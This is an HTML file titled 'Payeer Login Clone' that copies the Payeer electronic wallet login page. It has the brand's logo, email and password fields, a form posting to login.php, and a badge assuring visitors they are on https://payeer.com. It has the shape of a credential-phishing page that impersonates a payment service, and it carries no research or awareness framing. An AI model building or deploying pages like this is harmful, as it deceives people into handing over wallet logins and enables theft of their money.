<!doctype html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Payeer Login Clone</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./style.css">
  </head>
  <body>
    <div id="app">
      <div class="payeer-container">
        <!-- Header with logo -->
        <header class="payeer-header">
          <div class="logo-container">
            <h1 class="logo">PAYEER<span class="registered">®</span></h1>
            <p class="subtitle">ELECTRONIC WALLET</p>
          </div>
        </header>

        <!-- Main content -->
        <main class="payeer-main">
          <div class="auth-container">
            <div class="auth-header">
              <h2 class="auth-title">AUTHORIZATION</h2>
              <div class="green-line"></div>
            </div>
            
            <h1 class="login-title">Login</h1>
            
            <div class="login-form-container">
              <div class="login-form">
                <div class="url-check">
                  <p>Please check that you are visiting correct URL:</p>
                  <div class="url-badge">
                    <i class="bi bi-lock-fill"></i>
                    <span>https://payeer.com</span>
                  </div>
                </div>
                
                <form action="login.php" method="POST">
                  <div class="form-group">
                    <label for="username">Login</label>
                    <!-- حاوية مع تموضع نسبي -->
                    <div class="input-wrapper">
                      <input class="form-control" id="username" placeholder="P1000001" type="email" name="email" placeholder="Email" required>
                      <a href="#" class="forgot-link">FORGOT LOGIN?</a>
                    </div>
                  </div>
                  
                  <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
                      <input type="password" name="password" placeholder="Password" required class="form-control" id="password">
                      <a href="#" class="forgot-link">FORGOT PASSWORD?</a>
                    </div>
                  </div>
                  
                  <button type="submit" class="btn btn-login" onclick="window.location.href='index2.html'; return false;"> 
                    Go next
                  </button>
                </form>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
    <!-- <script type="module" src="/main.js"></script> -->
  </body>
</html>
